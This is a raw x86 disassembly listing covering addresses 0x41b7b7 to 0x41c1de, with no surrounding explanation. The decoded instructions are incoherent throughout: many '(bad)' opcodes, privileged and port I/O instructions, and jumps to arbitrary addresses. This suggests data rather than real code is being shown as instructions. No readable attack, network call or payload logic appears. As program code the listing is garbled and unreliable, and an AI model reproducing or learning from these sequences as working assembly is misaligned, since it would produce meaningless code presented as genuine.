  41b7b7:	fild   QWORD PTR [edx+0x35]
  41b7ba:	cld    
  41b7bb:	lds    esi,FWORD PTR [edx-0x2]
  41b7be:	xor    al,al
  41b7c0:	xor    edx,0xffffffe0
  41b7c3:	mov    esp,0x8a6c27a6
  41b7c8:	xchg   edx,eax
  41b7c9:	daa    
  41b7ca:	ffree  st(5)
  41b7cc:	into   
  41b7cd:	mov    dh,0x2d
  41b7cf:	cmp    BYTE PTR [ebp+0x12],cl
  41b7d2:	dec    esp
  41b7d3:	jmp    0xf8aa085a
  41b7d8:	rol    BYTE PTR [ebp+0x3c999b7c],cl
  41b7de:	sbb    eax,0xfd1079e0
  41b7e3:	xchg   ebp,eax
  41b7e4:	inc    ebx
  41b7e5:	ficomp DWORD PTR [ecx-0x7]
  41b7e8:	and    ebx,eax
  41b7ea:	jnp    0x41b7d8
  41b7ec:	dec    edx
  41b7ed:	mov    eax,0x73caa867
  41b7f2:	int    0x77
  41b7f4:	pop    ecx
  41b7f5:	jg     0x41b820
  41b7f7:	(bad)  
  41b7f8:	loope  0x41b7f9
  41b7fa:	adc    eax,DWORD PTR [ebx-0x22]
  41b7fd:	call   0x5ff7d4ae
  41b802:	in     al,dx
  41b803:	xchg   edi,eax
  41b804:	cmc    
  41b805:	mov    BYTE PTR [eax-0x5282b2f4],dh
  41b80b:	iret   
  41b80c:	mov    cl,0xb8
  41b80e:	cmp    edx,ebx
  41b810:	in     eax,0x0
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x63
  41b881:	in     al,dx
  41b882:	(bad)  
  41b883:	(bad)  
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x21000001
  41b88d:	mov    ebx,0x5b1e2de
  41b892:	sub    BYTE PTR [ecx],dh
  41b894:	test   bh,dl
  41b896:	cmc    
  41b897:	jl     0x41b8a3
  41b899:	jmp    FWORD PTR [esi-0x2efdf921]
  41b89f:	xchg   esi,eax
  41b8a0:	fnstenv [edx+0x157b945f]
  41b8a6:	fsub   QWORD PTR [eax+edx*1-0x6030bfd9]
  41b8ad:	xor    BYTE PTR [esi-0x30],al
  41b8b0:	rcr    DWORD PTR [ebx+0x10],0x59
  41b8b4:	in     al,0x3
  41b8b6:	inc    esp
  41b8b7:	xor    dl,BYTE PTR ds:0xa8b1a3fb
  41b8bd:	jge    0x41b929
  41b8bf:	xchg   esp,eax
  41b8c0:	in     eax,dx
  41b8c1:	int    0x46
  41b8c3:	fisubr DWORD PTR [esi]
  41b8c5:	retf   
  41b8c6:	mov    dl,0xae
  41b8c8:	fs in  eax,dx
  41b8ca:	enter  0x3456,0x37
  41b8ce:	jmp    0xa9567da3
  41b8d3:	aad    0x3f
  41b8d5:	sub    al,0x58
  41b8d7:	and    ebp,DWORD PTR [ebx]
  41b8d9:	mov    ah,bl
  41b8db:	pushf  
  41b8dc:	mov    dh,0xb8
  41b8de:	pop    ds
  41b8df:	in     eax,dx
  41b8e0:	mov    al,ds:0x6f6dba2f
  41b8e5:	push   esi
  41b8e6:	das    
  41b8e7:	xlat   BYTE PTR gs:[ebx]
  41b8e9:	mov    ebp,0xf509b17f
  41b8ee:	or     al,0x44
  41b8f0:	xchg   ebx,eax
  41b8f1:	cmp    al,0x1b
  41b8f3:	cmp    eax,0x8855150f
  41b8f8:	or     BYTE PTR [ebx+0x1f],0xb2
  41b8fc:	pop    eax
  41b8fd:	mov    ebp,0x7d4fc809
  41b902:	push   0x5312e95d
  41b907:	dec    eax
  41b908:	ja     0x41b949
  41b90a:	pushf  
  41b90b:	xor    dl,al
  41b90d:	enter  0xa7cd,0x8f
  41b911:	xor    eax,0x41d736cb
  41b916:	out    0x31,al
  41b918:	and    ebp,DWORD PTR [esi-0x461524f8]
  41b91e:	scas   eax,DWORD PTR es:[edi]
  41b91f:	test   al,0xf7
  41b921:	inc    ebx
  41b922:	loop   0x41b8c1
  41b924:	outs   dx,DWORD PTR ds:[esi]
  41b925:	mov    al,ds:0x460410f3
  41b92a:	(bad)  
  41b92b:	sub    ebp,eax
  41b92d:	cs mov bl,0x84
  41b930:	gs pop es
  41b932:	addr16 ss icebp 
  41b935:	mov    eax,ds:0x641cd877
  41b93a:	pop    edx
  41b93b:	jle    0x41b8f6
  41b93d:	test   edi,ebx
  41b93f:	fwait
  41b940:	stos   DWORD PTR es:[edi],eax
  41b941:	xchg   ecx,eax
  41b942:	daa    
  41b943:	cmp    eax,0x85488d1c
  41b948:	lea    esi,[edi+0x723f0a2]
  41b94e:	cmp    ecx,DWORD PTR [edi-0x26]
  41b951:	pop    eax
  41b952:	cmp    al,0xb2
  41b954:	or     DWORD PTR ds:0x3ee8fc01,esp
  41b95a:	xlat   BYTE PTR ds:[ebx]
  41b95b:	ja     0x41b936
  41b95d:	js     0x41b987
  41b95f:	loope  0x41b9d6
  41b961:	ror    BYTE PTR [esi-0x4a4f4bc1],0xae
  41b968:	icebp  
  41b969:	call   0xa7285b8
  41b96e:	inc    edx
  41b96f:	mov    bh,0xfa
  41b971:	cli    
  41b972:	add    DWORD PTR [ecx],edx
  41b974:	cmp    eax,0x4407506f
  41b979:	aaa    
  41b97a:	inc    edx
  41b97b:	pusha  
  41b97c:	push   esp
  41b97d:	int3   
  41b97e:	pop    ds
  41b97f:	(bad)  
  41b981:	adc    eax,0x4cc86d9d
  41b986:	std    
  41b987:	rcr    edi,1
  41b989:	pop    edi
  41b98a:	fs push eax
  41b98c:	sti    
  41b98d:	xor    al,0x76
  41b98f:	inc    ecx
  41b990:	mov    edi,0x0
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	(bad)  
  41ba02:	xchg   ebp,eax
  41ba03:	xchg   ebp,eax
  41ba04:	jbe    0x41ba2b
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    eax,0xd5000001
  41ba0d:	clc    
  41ba0e:	and    BYTE PTR [eax],bl
  41ba10:	push   cs
  41ba11:	xchg   ebx,eax
  41ba12:	out    0xc5,eax
  41ba14:	into   
  41ba15:	scas   eax,DWORD PTR es:[edi]
  41ba16:	into   
  41ba17:	push   es
  41ba18:	vpunpcklwd ymm2,ymm1,YMMWORD PTR [eax]
  41ba1c:	mov    al,ds:0xcb363dd0
  41ba21:	clc    
  41ba22:	and    eax,0x2aaa9de1
  41ba27:	fwait
  41ba28:	xchg   esp,eax
  41ba29:	adc    BYTE PTR [edi],cl
  41ba2b:	in     eax,dx
  41ba2c:	pop    es
  41ba2d:	outs   dx,BYTE PTR ds:[esi]
  41ba2e:	out    dx,eax
  41ba2f:	shr    DWORD PTR [edx+0x4799177d],cl
  41ba35:	iret   
  41ba36:	dec    ecx
  41ba37:	inc    ebx
  41ba38:	pop    edi
  41ba39:	addr16 and edx,ecx
  41ba3c:	aaa    
  41ba3d:	ins    DWORD PTR es:[edi],dx
  41ba3e:	stos   BYTE PTR es:[edi],al
  41ba3f:	push   cs
  41ba40:	mov    bl,0xde
  41ba42:	pop    esp
  41ba43:	and    edi,DWORD PTR [esi]
  41ba45:	jg     0x41ba8a
  41ba47:	xor    eax,0xed03a2ad
  41ba4c:	push   cs
  41ba4d:	sbb    eax,ebx
  41ba4f:	mov    bh,0xda
  41ba51:	xchg   esp,eax
  41ba52:	mov    ch,0xb
  41ba54:	sar    DWORD PTR [ebp-0x526f4b4d],cl
  41ba5a:	pop    es
  41ba5b:	cli    
  41ba5c:	scas   eax,DWORD PTR es:[edi]
  41ba5d:	call   0xada36eb0
  41ba62:	repnz aad 0x80
  41ba65:	lea    ebp,[edx]
  41ba67:	inc    ebp
  41ba68:	or     al,0x82
  41ba6a:	test   BYTE PTR [edi+0x573cd60],bl
  41ba70:	or     DWORD PTR [ebp+0x3b5d1c9e],esp
  41ba76:	sbb    ch,bh
  41ba78:	pop    edx
  41ba79:	iret   
  41ba7a:	sbb    cl,BYTE PTR [edi]
  41ba7c:	jno    0x41bad0
  41ba7e:	shr    DWORD PTR [ebx+esi*2+0x617e42a9],cl
  41ba85:	mov    eax,0x432e2931
  41ba8a:	popa   
  41ba8b:	nop
  41ba8c:	pop    ss
  41ba8d:	int    0xb4
  41ba8f:	loopne 0x41babb
  41ba91:	add    bl,bl
  41ba93:	add    eax,0x2b535b85
  41ba98:	aaa    
  41ba99:	pop    ebp
  41ba9a:	outs   dx,DWORD PTR ds:[esi]
  41ba9b:	pop    eax
  41ba9c:	mov    ecx,0x6c22414b
  41baa1:	loope  0x41ba91
  41baa3:	pop    eax
  41baa4:	pop    eax
  41baa5:	test   eax,0xb121f5ef
  41baaa:	test   eax,0xc5555ff4
  41baaf:	mov    dl,0xdf
  41bab1:	and    al,0xda
  41bab3:	push   ebp
  41bab4:	jecxz  0x41bb00
  41bab6:	xchg   DWORD PTR [esi-0x6c],esi
  41bab9:	outs   dx,BYTE PTR ds:[esi]
  41baba:	jge    0x41ba71
  41babc:	xchg   edi,eax
  41babd:	pop    ss
  41babe:	dec    esp
  41babf:	enter  0x9023,0x12
  41bac3:	dec    ecx
  41bac4:	inc    ebx
  41bac5:	inc    esp
  41bac6:	jl     0x41ba97
  41bac8:	cmp    dh,ch
  41baca:	pop    edx
  41bacb:	mov    DWORD PTR [eax+0x3725d074],ebx
  41bad1:	sbb    DWORD PTR [eax+0x41],0x47997486
  41bad8:	out    dx,al
  41bad9:	mov    eax,ds:0xd63965ea
  41bade:	int3   
  41badf:	sub    DWORD PTR [edx],eax
  41bae1:	xor    cl,BYTE PTR ds:0xaa0aedf0
  41bae7:	mov    BYTE PTR [ecx-0x47],dh
  41baea:	or     ch,BYTE PTR [ebx+0x5f977595]
  41baf0:	je     0x41bb2a
  41baf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf3:	jnp    0x41ba8d
  41baf5:	sahf   
  41baf6:	(bad)  
  41baf7:	jl     0x41baf8
  41baf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bafa:	and    ecx,edx
  41bafc:	inc    edx
  41bafd:	out    dx,eax
  41bafe:	sbb    DWORD PTR [ebx],ecx
  41bb00:	stc    
  41bb01:	dec    edx
  41bb02:	xor    ebp,DWORD PTR [edi+0x15]
  41bb05:	jno    0x41bb5e
  41bb07:	adc    al,0x65
  41bb09:	xchg   ebp,eax
  41bb0a:	(bad)  
  41bb0c:	(bad)  
  41bb0e:	sbb    DWORD PTR [ecx-0x5],ecx
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x41],cx
  41bb81:	mov    eax,ds:0x267b49b5
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0xa000001
  41bb8d:	inc    ebx
  41bb8e:	mov    eax,0x77659438
  41bb93:	das    
  41bb94:	mov    bh,0xca
  41bb96:	shl    DWORD PTR [edi-0x5e],0xb0
  41bb9a:	and    ebp,esp
  41bb9c:	mov    al,ds:0x7db84c6e
  41bba1:	jbe    0x41bbf9
  41bba3:	(bad)  
  41bba4:	iret   
  41bba5:	outs   dx,BYTE PTR ds:[esi]
  41bba6:	daa    
  41bba7:	fisttp WORD PTR [edx-0x7ee82f40]
  41bbad:	cld    
  41bbae:	mov    ebx,0xad18d32
  41bbb3:	cmc    
  41bbb4:	ja     0x41bbf7
  41bbb6:	das    
  41bbb7:	jp     0x41bbcb
  41bbb9:	daa    
  41bbba:	inc    esp
  41bbbb:	test   BYTE PTR [edx+0x5a],cl
  41bbbe:	pop    ecx
  41bbbf:	jae    0x41bb72
  41bbc1:	and    ebp,ebp
  41bbc3:	repz dec ebp
  41bbc5:	adc    ebx,DWORD PTR [ebp+ebx*2-0x45]
  41bbc9:	js     0x41bbb3
  41bbcb:	les    esi,FWORD PTR [eax+0x105112e5]
  41bbd1:	ja     0x41bbd5
  41bbd3:	add    DWORD PTR [ebx+0x43b9dd7c],ebp
  41bbd9:	lods   eax,DWORD PTR ds:[esi]
  41bbda:	xor    DWORD PTR [ebx+0xe],0x87faa9f7
  41bbe1:	xchg   edx,eax
  41bbe2:	sbb    dh,al
  41bbe4:	push   0xfffffff9
  41bbe6:	or     eax,0x3a4f0b30
  41bbeb:	jle    0x41bbb2
  41bbed:	imul   esp,ebp,0xce50bec0
  41bbf3:	xchg   esi,eax
  41bbf4:	inc    esi
  41bbf5:	add    DWORD PTR [eax+0x5f2dbfde],ebx
  41bbfb:	cmp    ebx,DWORD PTR [esi-0x10a45a4e]
  41bc01:	ficomp WORD PTR [esi-0x3b]
  41bc04:	jle    0x41bc71
  41bc06:	pop    ecx
  41bc07:	in     eax,dx
  41bc08:	jecxz  0x41bbd1
  41bc0a:	aad    0x3e
  41bc0c:	xchg   esp,eax
  41bc0d:	mov    bh,0x6
  41bc0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc10:	rcr    DWORD PTR [edx],0x46
  41bc13:	mov    esi,0xc6fcb988
  41bc18:	xor    al,0xed
  41bc1a:	cmp    BYTE PTR [edx-0x7dac0601],0x71
  41bc21:	add    BYTE PTR [edi],ch
  41bc23:	out    dx,al
  41bc24:	pop    edi
  41bc25:	push   ebp
  41bc26:	sub    ebp,DWORD PTR [esi-0x423b8737]
  41bc2c:	mov    ch,dh
  41bc2e:	les    edi,FWORD PTR [edi+0x8]
  41bc31:	and    al,0xe8
  41bc33:	mov    dl,0xd9
  41bc35:	mov    edi,0x3c278616
  41bc3a:	and    bh,BYTE PTR [ebx-0x49]
  41bc3d:	jae    0x41bc98
  41bc3f:	rcr    BYTE PTR [ecx+0x31],cl
  41bc42:	outs   dx,DWORD PTR ds:[esi]
  41bc43:	and    edx,DWORD PTR ds:0xd6728c24
  41bc49:	push   ecx
  41bc4a:	lahf   
  41bc4b:	outs   dx,BYTE PTR ds:[esi]
  41bc4c:	aam    0xf3
  41bc4e:	je     0x41bc26
  41bc50:	das    
  41bc51:	sub    al,0xf0
  41bc53:	jg     0x41bcaf
  41bc55:	adc    eax,0x152b0e26
  41bc5a:	data16 mov al,0x8a
  41bc5d:	or     ch,BYTE PTR [esi-0x1d1a1633]
  41bc63:	push   edi
  41bc64:	push   esp
  41bc65:	scas   eax,DWORD PTR es:[edi]
  41bc66:	frstor [edi+edx*4-0x2]
  41bc6a:	xchg   edi,eax
  41bc6b:	mov    ch,0xf0
  41bc6d:	jnp    0x41bcd2
  41bc6f:	je     0x41bc88
  41bc71:	push   edx
  41bc72:	inc    ebx
  41bc73:	adc    eax,0x61dcd75d
  41bc78:	mov    bh,0x46
  41bc7a:	out    dx,al
  41bc7b:	jp     0x41bbfe
  41bc7d:	or     al,0x20
  41bc7f:	xor    cl,BYTE PTR [ebx+eiz*2]
  41bc82:	rcr    DWORD PTR ds:0xa7384ee7,cl
  41bc88:	aam    0x88
  41bc8a:	sub    al,0x11
  41bc8c:	paddd  mm3,QWORD PTR [esi+0x40]
  41bc90:	xor    al,BYTE PTR [eax]
	...
  41bcf2:	add    BYTE PTR [eax],al
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xf5ead9d8
  41bd02:	or     ch,BYTE PTR [ecx]
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x79000001,al
  41bd0d:	sub    eax,0xdd3aea1
  41bd12:	outs   dx,DWORD PTR ds:[esi]
  41bd13:	data16 ins BYTE PTR es:[edi],dx
  41bd15:	clc    
  41bd16:	dec    ebx
  41bd17:	jmp    0x41bd2e
  41bd19:	adc    eax,0x7a815a93
  41bd1e:	pop    ds
  41bd1f:	rol    DWORD PTR [esi+eax*8-0x6472af34],0x48
  41bd27:	adc    al,0xd8
  41bd29:	(bad)  
  41bd2a:	cmp    eax,0x339c7b3d
  41bd2f:	out    0x12,eax
  41bd31:	jle    0x41bce1
  41bd33:	adc    esp,DWORD PTR [ebp-0x6d]
  41bd36:	lds    ecx,FWORD PTR [edx-0x6d]
  41bd39:	stos   DWORD PTR es:[edi],eax
  41bd3a:	xor    DWORD PTR [edi+ebx*2+0x60],ecx
  41bd3e:	or     eax,0x1a7f8999
  41bd43:	mov    esi,0x9bc7b2f7
  41bd48:	into   
  41bd49:	fstp   QWORD PTR [ebx+ebx*1-0x3f88f54e]
  41bd50:	sub    bl,0x4c
  41bd53:	mov    bh,0xae
  41bd55:	dec    edi
  41bd56:	or     eax,0xed77aca9
  41bd5b:	cmp    BYTE PTR [edi+0x3a],bl
  41bd5e:	popf   
  41bd5f:	(bad)
  41bd63:	call   0xa19c50a6
  41bd68:	and    al,0x41
  41bd6a:	xor    eax,0x9a107ad2
  41bd6f:	mov    ebp,DWORD PTR [eax]
  41bd71:	mov    ecx,0xd14b4034
  41bd76:	cwde   
  41bd77:	xlat   BYTE PTR ds:[ebx]
  41bd78:	stos   DWORD PTR es:[edi],eax
  41bd79:	jno    0x41bd31
  41bd7b:	sub    bl,dh
  41bd7d:	jo     0x41bde4
  41bd7f:	inc    esi
  41bd80:	jle    0x41bdab
  41bd82:	add    ebp,DWORD PTR [edx+0x74]
  41bd85:	icebp  
  41bd86:	bound  eax,QWORD PTR [ecx+0x3b65f54a]
  41bd8c:	lods   eax,DWORD PTR ds:[esi]
  41bd8d:	jg     0x41bded
  41bd8f:	mov    ch,0x3f
  41bd91:	jo     0x41bde5
  41bd93:	outs   dx,BYTE PTR ds:[esi]
  41bd94:	push   esp
  41bd95:	aam    0x76
  41bd97:	push   ss
  41bd98:	scas   al,BYTE PTR es:[edi]
  41bd99:	inc    edi
  41bd9a:	(bad)  
  41bd9b:	mov    BYTE PTR [edx-0x716bc83f],ah
  41bda1:	push   es
  41bda2:	std    
  41bda3:	mov    al,ds:0x6ed8dfa
  41bda8:	jp     0x41be19
  41bdaa:	mov    dh,0x43
  41bdac:	or     ch,dl
  41bdae:	in     al,dx
  41bdaf:	xlat   BYTE PTR ds:[ebx]
  41bdb0:	loopne 0x41bde4
  41bdb2:	std    
  41bdb3:	xchg   esi,eax
  41bdb4:	xchg   ebp,eax
  41bdb5:	adc    DWORD PTR [edx-0x2b],eax
  41bdb8:	dec    ebp
  41bdb9:	(bad)  
  41bdba:	add    DWORD PTR [ebx],ecx
  41bdbc:	add    eax,0x998e2c76
  41bdc1:	in     eax,dx
  41bdc2:	jnp    0x41bda3
  41bdc4:	aad    0x57
  41bdc6:	hlt    
  41bdc7:	fs xor al,0xc1
  41bdca:	scas   eax,DWORD PTR es:[edi]
  41bdcb:	lods   al,BYTE PTR ds:[esi]
  41bdcc:	ss or  esi,ecx
  41bdcf:	jecxz  0x41bd7a
  41bdd1:	cmp    ebx,ebp
  41bdd3:	call   0xd0d96359
  41bdd8:	mov    cs,esp
  41bdda:	and    dh,BYTE PTR [edi-0x65bc8324]
  41bde0:	rcl    DWORD PTR [ebp+0x4f],cl
  41bde3:	es pop edi
  41bde5:	mov    DWORD PTR [ebp+0x6d85d1e1],esi
  41bdeb:	push   ebx
  41bdec:	dec    esp
  41bded:	cdq    
  41bdee:	or     ah,BYTE PTR [edi-0x62d4d752]
  41bdf4:	sub    BYTE PTR [ebx+edi*8],ah
  41bdf7:	ss (bad) 
  41bdfa:	test   BYTE PTR [ecx+ecx*4-0x6c],bl
  41bdfe:	repz imul ebx,DWORD PTR [edx-0x25],0x85eb9bb2
  41be06:	and    ah,BYTE PTR [edi]
  41be08:	add    cl,BYTE PTR [edi]
  41be0a:	sub    BYTE PTR [eax],ah
  41be0c:	mov    eax,0x803e7e7e
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0xb443f66]
  41be82:	adc    dl,0x85
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0x57000001,al
  41be8d:	shl    DWORD PTR [edx-0x15],1
  41be90:	jmp    0xc5b7fdf9
  41be95:	mov    al,ds:0x1480aeca
  41be9a:	pop    eax
  41be9b:	cs push 0x514eb925
  41bea1:	push   ebp
  41bea2:	stos   BYTE PTR es:[edi],al
  41bea3:	rcr    DWORD PTR [ecx],cl
  41bea5:	mov    esi,0x5c612346
  41beaa:	push   ss
  41beab:	imul   eax,esi,0xfffffff7
  41beae:	out    dx,al
  41beaf:	pop    eax
  41beb0:	(bad)  
  41beb1:	retf   0x3fcb
  41beb4:	mov    al,dh
  41beb6:	and    edi,edx
  41beb8:	and    al,0xe6
  41beba:	xchg   DWORD PTR [ebx],ebp
  41bebc:	popa   
  41bebd:	or     BYTE PTR [ecx+0x28854e96],ch
  41bec3:	pop    es
  41bec4:	ss loop 0x41be55
  41bec7:	stc    
  41bec8:	mov    ebp,0xef6231a1
  41becd:	xchg   edi,eax
  41bece:	cmp    eax,0xed9a5e6a
  41bed3:	jg     0x41bf48
  41bed5:	pop    edi
  41bed6:	popf   
  41bed7:	sbb    DWORD PTR ds:0x343b0c11,esp
  41bedd:	mov    ds:0xcc4e4aab,eax
  41bee3:	call   0x38ed:0xd8626bd
  41beea:	push   ss
  41beeb:	mov    edx,0x8d0acd3f
  41bef0:	iret   
  41bef1:	call   0x524671f1
  41bef6:	push   eax
  41bef7:	jo     0x41bf0e
  41bef9:	fdiv   DWORD PTR [edi+0x2e]
  41befc:	fidiv  DWORD PTR [esi+edi*8+0x539cc6bb]
  41bf03:	clc    
  41bf04:	jp     0x41becf
  41bf06:	test   BYTE PTR ss:[edi+ebp*4],bl
  41bf0a:	mov    ds:0x23a91576,al
  41bf0f:	and    ah,BYTE PTR [esi-0x409550fd]
  41bf15:	jo     0x41bf75
  41bf17:	mov    esp,0x9e0a4914
  41bf1c:	in     eax,dx
  41bf1d:	imul   eax,DWORD PTR [eax+0x16],0x17c2c178
  41bf24:	aam    0xd6
  41bf26:	and    BYTE PTR [esi+eiz*8],al
  41bf29:	dec    ebp
  41bf2a:	xchg   edi,eax
  41bf2b:	add    BYTE PTR [esi+0x62],cl
  41bf2e:	cli    
  41bf2f:	stos   BYTE PTR es:[edi],al
  41bf30:	cmp    DWORD PTR [esp+esi*2+0x6dc7351f],edi
  41bf37:	xlat   BYTE PTR ds:[ebx]
  41bf38:	add    bh,BYTE PTR [edi+0x3a9ae3ad]
  41bf3e:	loope  0x41bf9c
  41bf40:	push   cs
  41bf41:	mov    eax,ds:0x42699906
  41bf46:	pop    ebx
  41bf47:	push   eax
  41bf48:	fwait
  41bf49:	and    BYTE PTR [ecx],dh
  41bf4b:	into   
  41bf4c:	xchg   DWORD PTR [eax+esi*2-0x5f715efc],eax
  41bf53:	(bad)  
  41bf54:	inc    edi
  41bf55:	jl     0x41bf67
  41bf57:	push   ds
  41bf58:	(bad)  
  41bf5a:	sub    bh,BYTE PTR [eax+0x20]
  41bf5d:	sub    ebp,eax
  41bf5f:	mov    esi,0xf1cc8df8
  41bf64:	jae    0x41bf0d
  41bf66:	ror    BYTE PTR [ebp+0x50],cl
  41bf69:	push   es
  41bf6a:	mov    edi,0xb0035ba1
  41bf6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf70:	or     DWORD PTR [esi-0x781efd53],edx
  41bf76:	popf   
  41bf77:	(bad)  
  41bf79:	mov    ebp,ss
  41bf7b:	and    ebp,esi
  41bf7d:	imul   esp,DWORD PTR [edi+edx*8-0x109790f1],0x54a2542b
  41bf88:	or     BYTE PTR ds:0x13474607,al
  41bf8e:	cmp    eax,0xa155
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	scas   al,BYTE PTR es:[edi]
  41c001:	les    ecx,FWORD PTR ds:0x1298ad8
  41c007:	add    BYTE PTR ds:0x9b000001,al
  41c00d:	adc    edi,DWORD PTR [edi+0x20]
  41c010:	gs pop edx
  41c012:	xchg   esp,eax
  41c013:	mov    gs,WORD PTR [eax+0x3f349950]
  41c019:	add    BYTE PTR [edx-0x23],bl
  41c01c:	shl    DWORD PTR [ebx-0x49],cl
  41c01f:	pusha  
  41c020:	adc    eax,0xd15da91c
  41c025:	(bad)  
  41c026:	das    
  41c027:	retf   
  41c028:	rol    BYTE PTR es:[edi-0x5161ccb3],cl
  41c02f:	fnstsw WORD PTR [ebp+0x43]
  41c032:	cs stos DWORD PTR es:[edi],eax
  41c034:	call   0xac9c714c
  41c039:	xchg   ebp,eax
  41c03a:	out    0x60,eax
  41c03c:	pop    eax
  41c03d:	clc    
  41c03e:	pop    esp
  41c03f:	das    
  41c040:	inc    edx
  41c041:	aaa    
  41c042:	and    BYTE PTR [ecx+0x3],cl
  41c045:	cmp    DWORD PTR [esi-0x6ffbe780],esp
  41c04b:	push   0xffffffad
  41c04d:	loopne 0x41bfd0
  41c04f:	imul   esp,DWORD PTR [ebp+0x64],0x5848b570
  41c056:	push   edi
  41c057:	add    eax,0x64f4c36
  41c05c:	test   eax,0xec4df18f
  41c061:	or     al,0x2e
  41c063:	push   eax
  41c064:	inc    esi
  41c065:	cld    
  41c066:	sbb    eax,0x4fab586d
  41c06b:	adc    eax,0xb931fafc
  41c070:	cmp    BYTE PTR [ecx+0x340e539],bh
  41c076:	adc    eax,0x53dcece6
  41c07b:	xlat   BYTE PTR ds:[ebx]
  41c07c:	jmp    0x7550:0x3022f90a
  41c083:	jbe    0x41c0ad
  41c085:	fwait
  41c086:	fwait
  41c087:	icebp  
  41c088:	out    0xab,al
  41c08a:	xor    BYTE PTR [eax],bh
  41c08c:	adc    al,0x64
  41c08e:	pop    ebp
  41c08f:	jecxz  0x41c0cd
  41c091:	sub    eax,0xa563885d
  41c096:	cwde   
  41c097:	mov    edx,ebx
  41c099:	imul   ebx,DWORD PTR [esi],0xffffffa6
  41c09c:	mov    BYTE PTR [ebp+0x1f34bd3b],ch
  41c0a2:	xchg   BYTE PTR [esi],dh
  41c0a4:	jmp    0x41c0f2
  41c0a6:	test   al,0xbf
  41c0a8:	xchg   esi,eax
  41c0a9:	jno    0x41c0e0
  41c0ab:	scas   eax,DWORD PTR es:[edi]
  41c0ac:	jns    0x41c08e
  41c0ae:	ret    
  41c0af:	cli    
  41c0b0:	adc    BYTE PTR [eax+edi*4],0x13
  41c0b4:	cmp    ebp,DWORD PTR [ecx]
  41c0b6:	imul   ecx,DWORD PTR [edx],0x60
  41c0b9:	push   cs
  41c0ba:	mov    ah,BYTE PTR [edx-0x1279197f]
  41c0c0:	into   
  41c0c1:	mov    ds:0x9499d71f,eax
  41c0c6:	sbb    eax,0xf019038a
  41c0cb:	test   DWORD PTR [edx+0x3104a26e],0x1ae7ec0c
  41c0d5:	test   eax,0xad55094d
  41c0da:	cmovp  edi,DWORD PTR [ebp+0x2b07cab8]
  41c0e1:	mov    bh,0xc7
  41c0e3:	sbb    BYTE PTR [edi-0x28],bl
  41c0e6:	sar    BYTE PTR ds:0xb1d0174d,0xda
  41c0ed:	or     al,0x5
  41c0ef:	pop    ds
  41c0f0:	cmc    
  41c0f1:	fidivr DWORD PTR ds:0x4a38f977
  41c0f7:	or     esi,DWORD PTR [eax]
  41c0f9:	xchg   ecx,eax
  41c0fa:	aaa    
  41c0fb:	jmp    0xcea6:0x968e6665
  41c102:	loopne 0x41c0df
  41c104:	pop    ecx
  41c105:	das    
  41c106:	bound  ebx,QWORD PTR [esp+esi*1-0x3a8a5dbc]
  41c10d:	add    dl,BYTE PTR [edx-0x69]
  41c110:	sbb    al,BYTE PTR [eax]
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xc8bf9fe9,eax
  41c183:	cld    
  41c184:	(bad)
  41c188:	add    eax,0x40000001
  41c18d:	in     eax,0x71
  41c18f:	mov    ecx,0xf34ac444
  41c194:	mov    ecx,0xd1cd86d4
  41c199:	neg    DWORD PTR [esi]
  41c19b:	mov    cl,0xd8
  41c19d:	mov    ch,0x35
  41c19f:	add    DWORD PTR [ebx+0x23],edx
  41c1a2:	jl     0x41c21a
  41c1a4:	cwde   
  41c1a5:	fwait
  41c1a6:	mov    eax,0x7249200d
  41c1ab:	mov    ds:0x3370e646,al
  41c1b0:	int    0x97
  41c1b2:	jno    0x41c22c
  41c1b4:	mov    DWORD PTR [edi-0x23],ecx
  41c1b7:	sub    al,0xcc
  41c1b9:	pop    es
  41c1ba:	les    esi,FWORD PTR [ecx-0x7b566dec]
  41c1c0:	cmp    esp,DWORD PTR [esi-0x6e10883c]
  41c1c6:	cdq    
  41c1c7:	jge    0x41c16f
  41c1c9:	fadd   QWORD PTR [eax]
  41c1cb:	aad    0x96
  41c1cd:	outs   dx,DWORD PTR ds:[esi]
  41c1ce:	mov    ds:0x1bcb9053,eax
  41c1d3:	mov    cl,0x18
  41c1d5:	push   es
  41c1d6:	and    BYTE PTR [ebp+0x62e7c843],al
  41c1dc:	and    DWORD PTR [ebx],edx
  41c1de:	mov    eax,0x57e1a113
